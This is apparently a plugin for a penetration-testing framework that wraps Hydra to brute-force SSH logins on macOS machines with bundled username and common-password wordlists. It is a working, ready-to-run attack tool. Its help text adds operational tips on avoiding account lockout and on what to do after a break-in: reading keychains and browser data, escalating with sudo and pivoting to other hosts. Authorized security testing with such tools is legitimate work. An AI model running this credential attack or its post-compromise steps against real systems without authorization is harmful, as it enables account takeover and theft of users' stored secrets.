#!/usr/bin/env python3
"""
souleyez.plugins.macos_ssh

macOS SSH brute force plugin using Hydra.
Attacks SSH on macOS systems with common credentials.
"""

import subprocess
import time
from typing import List

from souleyez.security.validation import ValidationError, validate_target

from .plugin_base import PluginBase

HELP = {
    "name": "macOS SSH Brute — Remote Login Attack",
    "description": (
        "Brute force SSH on macOS with common credentials.\n\n"
        "macOS Remote Login (SSH) uses local user accounts. Many Mac users:\n"
        "- Use simple passwords\n"
        "- Reuse their iCloud password\n"
        "- Have short names like 'admin', 'user'\n\n"
        "This plugin tests common macOS username/password combinations.\n\n"
        "Quick tips:\n"
        "- Remote Login must be enabled in macOS preferences\n"
        "- Use low threads to avoid lockout\n"
        "- macOS may have password policies\n"
        "- Success gives full shell access\n"
    ),
    "usage": "souleyez jobs enqueue macos_ssh <target>",
    "examples": [
        "souleyez jobs enqueue macos_ssh 192.168.1.100",
        'souleyez jobs enqueue macos_ssh 192.168.1.100 --args "-l admin"',
    ],
    "flags": [
        ["-l USER", "Single username to test"],
        ["-L FILE", "Username list file"],
        ["--port PORT", "SSH port (default: 22)"],
    ],
    "presets": [
        {"name": "Common Users", "args": [], "desc": "Test common macOS usernames"},
        {
            "name": "Admin Only",
            "args": ["-l", "admin"],
            "desc": "Test 'admin' user only",
        },
    ],
    "help_sections": [
        {
            "title": "What is macOS SSH Brute Force?",
            "color": "cyan",
            "content": [
                (
                    "Overview",
                    [
                        "Brute forces SSH (Remote Login) on macOS systems",
                        "Uses Hydra with macOS-specific username wordlists",
                        "Targets local user accounts on the Mac",
                    ],
                ),
                (
                    "Why macOS is Targeted",
                    [
                        "Many users use simple, memorable passwords",
                        "Often same password as their Apple ID/iCloud",
                        "Short usernames like 'admin', 'user', first names",
                        "Remote Login often left enabled after initial setup",
                    ],
                ),
            ],
        },
        {
            "title": "Usage & Examples",
            "color": "green",
            "content": [
                (
                    "Basic Usage",
                    [
                        "souleyez jobs enqueue macos_ssh 192.168.1.100",
                        "  → Tests common macOS users with common passwords",
                    ],
                ),
                (
                    "Target Specific User",
                    [
                        'souleyez jobs enqueue macos_ssh 192.168.1.100 --args "-l john"',
                        "  → Only tests the 'john' user account",
                    ],
                ),
            ],
        },
        {
            "title": "Tips & Best Practices",
            "color": "yellow",
            "content": [
                (
                    "Before Attacking",
                    [
                        "Verify SSH is enabled (port 22 open in nmap scan)",
                        "Check for mDNS discovery results for usernames",
                        "Low thread count (-t 2) to avoid lockouts",
                    ],
                ),
                (
                    "After Success",
                    [
                        "Full shell access to macOS system",
                        "Can access user files, keychains, browser data",
                        "May be able to sudo if user is admin",
                        "Pivot to other systems on the network",
                    ],
                ),
            ],
        },
    ],
}


class MacOSSSHPlugin(PluginBase):
    name = "macOS SSH"
    tool = "hydra"
    category = "exploitation"
    HELP = HELP

    def _get_wordlist_path(self, filename: str) -> str:
        """Get path to wordlist file."""
        from souleyez.wordlists import resolve_wordlist_path

        return resolve_wordlist_path(f"data/wordlists/{filename}")

    def build_command(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ):
        """Build Hydra command for macOS SSH brute force."""
        args = args or []

        try:
            target = validate_target(target)
        except ValidationError as e:
            if log_path:
                with open(log_path, "w") as f:
                    f.write(f"ERROR: Invalid target: {e}\n")
            return None

        # Parse args
        has_user = "-l" in args or "-L" in args
        port = "22"

        clean_args = []
        i = 0
        while i < len(args):
            if args[i] == "--port" and i + 1 < len(args):
                port = args[i + 1]
                i += 2
            else:
                clean_args.append(args[i])
                i += 1

        users = self._get_wordlist_path("macos_users.txt")
        passwords = self._get_wordlist_path("top100.txt")

        cmd = ["hydra"]

        if not has_user:
            cmd.extend(["-L", users])

        cmd.extend(clean_args)
        cmd.extend(
            [
                "-P",
                passwords,
                "-s",
                port,
                "-t",
                "1",  # Single thread for SSH
                "-w",
                "5",  # 5 second delay
                "-vV",
                "-f",
                target,
                "ssh",
            ]
        )

        return {"cmd": cmd, "timeout": 3600}

    def run(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ) -> int:
        """Execute macOS SSH brute force."""
        cmd_spec = self.build_command(target, args, label, log_path)
        if cmd_spec is None:
            return 1

        cmd = cmd_spec["cmd"]

        if log_path:
            with open(log_path, "w") as f:
                f.write(f"# macOS SSH Brute Force on {target}\n")
                f.write(f"# Command: {' '.join(cmd)}\n")
                f.write(f"# Started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

        try:
            with open(log_path, "a") as f:
                result = subprocess.run(
                    cmd, stdout=f, stderr=subprocess.STDOUT, timeout=cmd_spec["timeout"]
                )
            return result.returncode
        except subprocess.TimeoutExpired:
            if log_path:
                with open(log_path, "a") as f:
                    f.write("\n\n# ERROR: Brute force timed out\n")
            return 124
        except Exception as e:
            if log_path:
                with open(log_path, "a") as f:
                    f.write(f"\n\n# ERROR: {e}\n")
            return 1


plugin = MacOSSSHPlugin()
